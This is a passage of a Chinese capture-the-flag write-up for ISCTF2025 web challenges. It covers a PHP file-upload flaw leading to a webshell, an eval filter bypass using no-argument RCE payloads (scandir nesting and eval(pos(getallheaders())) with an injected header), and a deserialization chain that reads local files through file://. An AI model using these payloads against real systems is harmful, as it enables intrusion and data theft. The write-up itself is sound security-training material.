<span class="title">type</span>=&quot;<span class="title">text</span>&quot;  <span class="title">class</span>=&quot;<span class="title">form</span>-<span class="title">control</span>&quot; <span class="title">name</span>=&quot;<span class="title">n</span>&quot; <span class="title">required</span>/&gt;&lt;/<span class="title">td</span>&gt;</span></span><br><span class="line"><span class="class">				&lt;/<span class="title">tr</span>&gt;</span></span><br><span class="line"><span class="class">				&lt;<span class="title">tr</span>&gt;</span></span><br><span class="line"><span class="class">					&lt;<span class="title">td</span>&gt;<span class="title">Your</span> <span class="title">Email</span> &lt;/<span class="title">td</span>&gt;</span></span><br><span class="line"><span class="class">					&lt;<span class="title">Td</span>&gt;&lt;<span class="title">input</span> <span class="title">type</span>=&quot;<span class="title">email</span>&quot;  <span class="title">class</span>=&quot;<span class="title">form</span>-<span class="title">control</span>&quot; <span class="title">name</span>=&quot;<span class="title">e</span>&quot; <span class="title">required</span>/&gt;&lt;/<span class="title">td</span>&gt;</span></span><br><span class="line"><span class="class">				&lt;/<span class="title">tr</span>&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">				&lt;<span class="title">tr</span>&gt;</span></span><br><span class="line"><span class="class">					&lt;<span class="title">td</span>&gt;<span class="title">Your</span> <span class="title">Password</span> &lt;/<span class="title">td</span>&gt;</span></span><br><span class="line"><span class="class">					&lt;<span class="title">Td</span>&gt;&lt;<span class="title">input</span> <span class="title">type</span>=&quot;<span class="title">password</span>&quot;  <span class="title">class</span>=&quot;<span class="title">form</span>-<span class="title">control</span>&quot; <span class="title">name</span>=&quot;<span class="title">p</span>&quot; <span class="title">required</span>/&gt;&lt;/<span class="title">td</span>&gt;</span></span><br><span class="line"><span class="class">				&lt;/<span class="title">tr</span>&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">				&lt;<span class="title">tr</span>&gt;</span></span><br><span class="line"><span class="class">					&lt;<span class="title">td</span>&gt;<span class="title">Your</span> <span class="title">Mobile</span> <span class="title">No</span>. &lt;/<span class="title">td</span>&gt;</span></span><br><span class="line"><span class="class">					&lt;<span class="title">Td</span>&gt;&lt;<span class="title">input</span>  <span class="title">class</span>=&quot;<span class="title">form</span>-<span class="title">control</span>&quot; <span class="title">type</span>=&quot;<span class="title">number</span>&quot; <span class="title">name</span>=&quot;<span class="title">mob</span>&quot; <span class="title">required</span>/&gt;&lt;/<span class="title">td</span>&gt;</span></span><br><span class="line"><span class="class">				&lt;/<span class="title">tr</span>&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">				&lt;<span class="title">tr</span>&gt;</span></span><br><span class="line"><span class="class">					&lt;<span class="title">td</span>&gt;<span class="title">Select</span> <span class="title">Your</span> <span class="title">Gender</span>&lt;/<span class="title">td</span>&gt;</span></span><br><span class="line"><span class="class">					&lt;<span class="title">Td</span>&gt;</span></span><br><span class="line"><span class="class">				<span class="title">Male</span>&lt;<span class="title">input</span> <span class="title">type</span>=&quot;<span class="title">radio</span>&quot; <span class="title">name</span>=&quot;<span class="title">gen</span>&quot; <span class="title">value</span>=&quot;<span class="title">m</span>&quot; <span class="title">required</span>/&gt;</span></span><br><span class="line"><span class="class">				<span class="title">Female</span>&lt;<span class="title">input</span> <span class="title">type</span>=&quot;<span class="title">radio</span>&quot; <span class="title">name</span>=&quot;<span class="title">gen</span>&quot; <span class="title">value</span>=&quot;<span class="title">f</span>&quot;/&gt;</span></span><br><span class="line"><span class="class">					&lt;/<span class="title">td</span>&gt;</span></span><br><span class="line"><span class="class">				&lt;/<span class="title">tr</span>&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">				&lt;<span class="title">tr</span>&gt;</span></span><br><span class="line"><span class="class">					&lt;<span class="title">td</span>&gt;<span class="title">Choose</span> <span class="title">Your</span> <span class="title">Hobbies</span>&lt;/<span class="title">td</span>&gt;</span></span><br><span class="line"><span class="class">					&lt;<span class="title">Td</span>&gt;</span></span><br><span class="line"><span class="class">					<span class="title">Reading</span>&lt;<span class="title">input</span> <span class="title">value</span>=&quot;<span class="title">reading</span>&quot; <span class="title">type</span>=&quot;<span class="title">checkbox</span>&quot; <span class="title">name</span>=&quot;<span class="title">hob</span>[]&quot;/&gt;</span></span><br><span class="line"><span class="class">					<span class="title">Singing</span>&lt;<span class="title">input</span> <span class="title">value</span>=&quot;<span class="title">singin</span>&quot; <span class="title">type</span>=&quot;<span class="title">checkbox</span>&quot; <span class="title">name</span>=&quot;<span class="title">hob</span>[]&quot;/&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">					<span class="title">Playing</span>&lt;<span class="title">input</span> <span class="title">value</span>=&quot;<span class="title">playing</span>&quot; <span class="title">type</span>=&quot;<span class="title">checkbox</span>&quot; <span class="title">name</span>=&quot;<span class="title">hob</span>[]&quot;/&gt;</span></span><br><span class="line"><span class="class">					&lt;/<span class="title">td</span>&gt;</span></span><br><span class="line"><span class="class">				&lt;/<span class="title">tr</span>&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">				&lt;<span class="title">tr</span>&gt;</span></span><br><span class="line"><span class="class">					&lt;<span class="title">td</span>&gt;<span class="title">Upload</span>  <span class="title">Your</span> <span class="title">Image</span> &lt;/<span class="title">td</span>&gt;</span></span><br><span class="line"><span class="class">					&lt;<span class="title">Td</span>&gt;&lt;<span class="title">input</span> <span class="title">class</span>=&quot;<span class="title">form</span>-<span class="title">control</span>&quot; <span class="title">type</span>=&quot;<span class="title">file</span>&quot; <span class="title">name</span>=&quot;<span class="title">img</span>&quot; <span class="title">required</span>/&gt;&lt;/<span class="title">td</span>&gt;</span></span><br><span class="line"><span class="class">				&lt;/<span class="title">tr</span>&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">				&lt;<span class="title">tr</span>&gt;</span></span><br><span class="line"><span class="class">					&lt;<span class="title">td</span>&gt;<span class="title">Date</span> <span class="title">of</span> <span class="title">Birth</span>&lt;/<span class="title">td</span>&gt;</span></span><br><span class="line"><span class="class">					&lt;<span class="title">Td</span>&gt;</span></span><br><span class="line"><span class="class">					&lt;<span class="title">select</span> <span class="title">name</span>=&quot;<span class="title">yy</span>&quot; <span class="title">required</span>&gt;</span></span><br><span class="line"><span class="class">					&lt;<span class="title">option</span> <span class="title">value</span>=&quot;&quot;&gt;<span class="title">Year</span>&lt;/<span class="title">option</span>&gt;</span></span><br><span class="line"><span class="class">					&lt;?<span class="title">php</span></span></span><br><span class="line"><span class="class">					<span class="title">for</span>($<span class="title">i</span>=1950;$<span class="title">i</span>&lt;=2016;$<span class="title">i</span>++)</span></span><br><span class="line"><span class="class">					</span>&#123;</span><br><span class="line">					<span class="keyword">echo</span> <span class="string">&quot;&lt;option&gt;&quot;</span>.<span class="variable">$i</span>.<span class="string">&quot;&lt;/option&gt;&quot;</span>;</span><br><span class="line">					&#125;</span><br><span class="line">					<span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">					&lt;/select&gt;</span><br><span class="line"></span><br><span class="line">					&lt;select name=<span class="string">&quot;mm&quot;</span> required&gt;</span><br><span class="line">					&lt;option value=<span class="string">&quot;&quot;</span>&gt;Month&lt;/option&gt;</span><br><span class="line">					<span class="meta">&lt;?php</span></span><br><span class="line">					<span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">1</span>;<span class="variable">$i</span>&lt;=<span class="number">12</span>;<span class="variable">$i</span>++)</span><br><span class="line">					&#123;</span><br><span class="line">					<span class="keyword">echo</span> <span class="string">&quot;&lt;option&gt;&quot;</span>.<span class="variable">$i</span>.<span class="string">&quot;&lt;/option&gt;&quot;</span>;</span><br><span class="line">					&#125;</span><br><span class="line">					<span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">					&lt;/select&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">					&lt;select name=<span class="string">&quot;dd&quot;</span> required&gt;</span><br><span class="line">					&lt;option value=<span class="string">&quot;&quot;</span>&gt;Date&lt;/option&gt;</span><br><span class="line">					<span class="meta">&lt;?php</span></span><br><span class="line">					<span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">1</span>;<span class="variable">$i</span>&lt;=<span class="number">31</span>;<span class="variable">$i</span>++)</span><br><span class="line">					&#123;</span><br><span class="line">					<span class="keyword">echo</span> <span class="string">&quot;&lt;option&gt;&quot;</span>.<span class="variable">$i</span>.<span class="string">&quot;&lt;/option&gt;&quot;</span>;</span><br><span class="line">					&#125;</span><br><span class="line">					<span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">					&lt;/select&gt;</span><br><span class="line"></span><br><span class="line">					&lt;/td&gt;</span><br><span class="line">				&lt;/tr&gt;</span><br><span class="line"></span><br><span class="line">				&lt;tr&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;Td colspan=<span class="string">&quot;2&quot;</span> align=<span class="string">&quot;center&quot;</span>&gt;</span><br><span class="line">&lt;input type=<span class="string">&quot;submit&quot;</span> <span class="class"><span class="keyword">class</span>=&quot;<span class="title">btn</span> <span class="title">btn</span>-<span class="title">success</span>&quot; <span class="title">value</span>=&quot;<span class="title">Save</span>&quot; <span class="title">name</span>=&quot;<span class="title">save</span>&quot;/&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">input</span> <span class="title">type</span>=&quot;<span class="title">reset</span>&quot; <span class="title">class</span>=&quot;<span class="title">btn</span> <span class="title">btn</span>-<span class="title">success</span>&quot; <span class="title">value</span>=&quot;<span class="title">Reset</span>&quot;/&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">					&lt;/<span class="title">td</span>&gt;</span></span><br><span class="line"><span class="class">				&lt;/<span class="title">tr</span>&gt;</span></span><br><span class="line"><span class="class">			&lt;/<span class="title">table</span>&gt;</span></span><br><span class="line"><span class="class">		&lt;/<span class="title">form</span>&gt;</span></span><br><span class="line"><span class="class">	&lt;/<span class="title">body</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">html</span>&gt;</span></span><br><span class="line"><span class="class"></span></span><br></pre></td></tr></table></figure>

<p>看到image参数并没有做任何的处理，那就尝试打文件上传</p>
<p>先上传一个<code>phpinfo</code>，注册成功后根据代码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">mkdir</span>(<span class="string">&quot;images/<span class="subst">$e</span>&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;img&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>],<span class="string">&quot;images/<span class="subst">$e</span>/&quot;</span>.<span class="variable">$_FILES</span>[<span class="string">&#x27;img&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]);</span><br></pre></td></tr></table></figure>

<p>访问<code>/images/1@qq.com/1.php</code>就出来了</p>
<p><img src="/../image/achieve/202411/ISCTF2025/image-20251203145522015.png" alt="image-20251203145522015"></p>
<p>那就正常传马打就行了</p>
<h1 id="ezrce"><a href="#ezrce" class="headerlink" title="ezrce"></a>ezrce</h1><h2 id="RCEbypass"><a href="#RCEbypass" class="headerlink" title="#RCEbypass"></a>#RCEbypass</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$code</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^[A-Za-z\(\)_;]+$/&#x27;</span>, <span class="variable">$code</span>)) &#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;师傅，你想拿flag？&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>先用个脚本输出可用字符吧，懒得看了</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">32</span>;<span class="variable">$i</span>&lt;<span class="number">127</span>;<span class="variable">$i</span>++)&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/^[A-Za-z\(\)_;]+$/&quot;</span>, <span class="title function_ invoke__">chr</span>(<span class="variable">$i</span>)))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="title function_ invoke__">chr</span>(<span class="variable">$i</span>);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ();ABCDEFGHIJKLMNOPQRSTUVWXYZ_abcdefghijklmnopqrstuvwxyz</span></span><br></pre></td></tr></table></figure>

<p>只能用字母和括号以及逗号下划线，那不就可以打无参RCE进行函数嵌套吗</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=<span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">chr</span>(<span class="title function_ invoke__">ord</span>(<span class="title function_ invoke__">strrev</span>(<span class="title function_ invoke__">crypt</span>(<span class="title function_ invoke__">serialize</span>(<span class="keyword">array</span>())))))));</span><br></pre></td></tr></table></figure>

<p><img src="/../image/achieve/202411/ISCTF2025/image-20251203151124070.png" alt="image-20251203151124070"></p>
<p>看到flag在根目录，读半天读不出来，算了，直接用请求头无参数RCE去打吧</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/?code=eval(pos(getallheaders()));</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>challenge.bluesharkinfo.com:27283</span><br><span class="line"><span class="attribute">Pragma</span><span class="punctuation">: </span>no-cache</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>no-cache</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>PHPSESSID=561681024d70a205fd5c54ffd41bb975</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Flag</span><span class="punctuation">: </span>phpinfo();</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/../image/achieve/202411/ISCTF2025/image-20251203151726518.png" alt="image-20251203151726518"></p>
<h1 id="来签个到吧"><a href="#来签个到吧" class="headerlink" title="来签个到吧"></a>来签个到吧</h1><h2 id="反序列化-文件读取"><a href="#反序列化-文件读取" class="headerlink" title="反序列化+文件读取"></a>反序列化+文件读取</h2><p>这个题不知道我的是不是预期解，感觉还是比较好玩</p>
<p>先看附件</p>
<p>在docker文件中可以看到是php8.2版本，并且在sh文件中发现flag在根目录且没有设置权限</p>
<p>index.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&quot;./config.php&quot;</span>;</span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&quot;./classes.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&quot;REQUEST_METHOD&quot;</span>] === <span class="string">&quot;POST&quot;</span>) &#123;</span><br><span class="line">    <span class="variable">$s</span> = <span class="variable">$_POST</span>[<span class="string">&quot;shark&quot;</span>] ?? <span class="string">&#x27;喵喵喵?&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">str_starts_with</span>(<span class="variable">$s</span>, <span class="string">&quot;blueshark:&quot;</span>)) &#123;</span><br><span class="line">        <span class="variable">$ss</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$s</span>, <span class="title function_ invoke__">strlen</span>(<span class="string">&quot;blueshark:&quot;</span>));</span><br><span class="line"></span><br><span class="line">        <span class="variable">$o</span> = @<span class="title function_ invoke__">unserialize</span>(<span class="variable">$ss</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$p</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">prepare</span>(<span class="string">&quot;INSERT INTO notes (content) VALUES (?)&quot;</span>);</span><br><span class="line">        <span class="variable">$p</span>-&gt;<span class="title function_ invoke__">execute</span>([<span class="variable">$ss</span>]);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;save sucess!&quot;</span>;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;喵喵喵?&quot;</span>;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$q</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="string">&quot;SELECT id, content FROM notes ORDER BY id DESC LIMIT 10&quot;</span>);</span><br><span class="line"><span class="variable">$rows</span> = <span class="variable">$q</span>-&gt;<span class="title function_ invoke__">fetchAll</span>(PDO::<span class="variable constant_">FETCH_ASSOC</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>post传参shark并且以<code>blueshark:</code>开头，后面的内容就是我们需要反序列化的内容，并把我们传入的序列化字符串存入数据库中的content字段</p>
<p>如果不是post传参的话就会查询并返回数据结果</p>
<p>classes.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileLogger</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$logfile</span> = <span class="string">&quot;/tmp/notehub.log&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$content</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$f</span>=<span class="literal">null</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$f</span>) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;logfile = <span class="variable">$f</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">write</span>(<span class="params"><span class="variable">$msg</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;content .= <span class="variable">$msg</span> . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">        <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$this</span>-&gt;logfile, <span class="variable">$this</span>-&gt;content, FILE_APPEND);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;content) &#123;</span><br><span class="line">            <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$this</span>-&gt;logfile, <span class="variable">$this</span>-&gt;content, FILE_APPEND);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ShitMountant</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$url</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$logger</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$url</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;url = <span class="variable">$url</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;logger = <span class="keyword">new</span> <span class="title class_">FileLogger</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">fetch</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$c</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;url);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;logger) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;logger-&gt;<span class="title function_ invoke__">write</span>(<span class="string">&quot;fetched ==&gt; &quot;</span> . <span class="variable">$this</span>-&gt;url);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$c</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">fetch</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>一开始想打file_get_contents伪协议读取文件的，但是他没有打印输出，只会返回，但是写文件的话没找到哪里可以解析触发的地方</p>
<p>看到里面有一个api.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&quot;./config.php&quot;</span>;</span><br><span class="line"><span class="keyword">require_once</span> <span class="string">&quot;./classes.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$id</span> = <span class="variable">$_GET</span>[<span class="string">&quot;id&quot;</span>] ?? <span class="string">&#x27;喵喵喵?&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$s</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">prepare</span>(<span class="string">&quot;SELECT content FROM notes WHERE id = ?&quot;</span>);</span><br><span class="line"><span class="variable">$s</span>-&gt;<span class="title function_ invoke__">execute</span>([<span class="variable">$id</span>]);</span><br><span class="line"><span class="variable">$row</span> = <span class="variable">$s</span>-&gt;<span class="title function_ invoke__">fetch</span>(PDO::<span class="variable constant_">FETCH_ASSOC</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (! <span class="variable">$row</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;喵喵喵?&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$cfg</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$row</span>[<span class="string">&quot;content&quot;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$cfg</span> <span class="keyword">instanceof</span> ShitMountant) &#123;</span><br><span class="line">    <span class="variable">$r</span> = <span class="variable">$cfg</span>-&gt;<span class="title function_ invoke__">fetch</span>();</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;ok!&quot;</span> . <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">nl2br</span>(<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$r</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;喵喵喵?&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>看到这就有一个大致的思路了，这里会查询我们指定的id对应的content字段内容，并进行反序列化，如果反序列化的结果中有ShitMountant类的实例化对象，就会调用fetch函数并输出函数返回结果，这也和我一开始看到那个函数没有打印只有return对应上了</p>
<p>在classes.php中有一个log文件，尝试验证我们的想法</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ShitMountant</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$url</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$logger</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">ShitMountant</span>();</span><br><span class="line"><span class="variable">$a</span> -&gt; url = <span class="string">&quot;file:///tmp/notehub.db&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure>

<p>将序列化字符串写入数据库</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/index.php</span><br><span class="line">shark=blueshark:O%3A12%3A%22ShitMountant%22%3A2%3A%7Bs%3A3%3A%22url%22%3Bs%3A22%3A%22file%3A%2F%2F%2Ftmp%2Fnotehub.db%22%3Bs%3A6%3A%22logger%22%3BN%3B%7D</span><br></pre></td></tr></table></figure>

<p>GET访问一下index.php可以看到有回显结果</p>
<p><img src="/../image/achieve/202411/ISCTF2025/image-20251203155205766.png" alt="image-20251203155205766"></p>
<p>然后在api.php中进行反序列化并触发fetch函数</p>
<p><img src="/../image/achieve/202411/java%E5%AD%A6%E4%B9%A0/image-20251203155247502.png" alt="image-20251203155247502"></p>
